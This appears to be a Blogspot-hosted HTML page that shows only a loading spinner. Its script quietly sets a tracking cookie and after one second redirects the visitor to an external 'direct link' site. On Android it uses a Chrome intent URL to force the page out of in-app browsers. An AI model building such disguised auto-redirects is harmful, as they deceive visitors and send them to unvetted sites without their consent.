<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    body, html {
      height: 100%;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f3f3f3;
      font-family: sans-serif;
    }

    .spinner {
      border: 16px solid #f3f3f3;
      border-top: 16px solid #3498db;
      border-radius: 50%;
      width: 120px;
      height: 120px;
      animation: spin 2s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>

  <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'>
  <meta name='google-adsense-platform-domain' content='blogspot.com'>
  <script type="text/javascript" language="javascript">
    // Supply ads personalization default for EEA readers
    // See https://www.blogger.com/go/adspersonalization
    adsbygoogle = window.adsbygoogle || [];
    if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
      adsbygoogle.requestNonPersonalizedAds = 1;
    }
  </script>
</head>
<body>
  <div class="spinner"></div>

  <script type="text/javascript">
    document.addEventListener("DOMContentLoaded", function() {
      var directLink = "https://www.card-vault.xyz/"; // তোমার direct link

      // Hidden cookie set করা (কোনো বার দেখাবে না)
      document.cookie = "user_visited=true; path=/; max-age=" + 60*60*24*30 + ";"; 

      // Function to open link based on device
      function openLinkBasedOnDevice(url) {
        var userAgent = navigator.userAgent;

        if (/(android)/i.test(userAgent)) {
          // Android - open in Chrome
          window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
        } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
          // iOS - open in Safari
          window.location.href = url;
        } else {
          // Other devices - default browser
          window.location.href = url;
        }
      }

      // Automatically execute after 1-second delay
      setTimeout(function () {
        openLinkBasedOnDevice(directLink);
      }, 1000); // 1000ms = 1 second
    });
  </script>
</body>
</html>
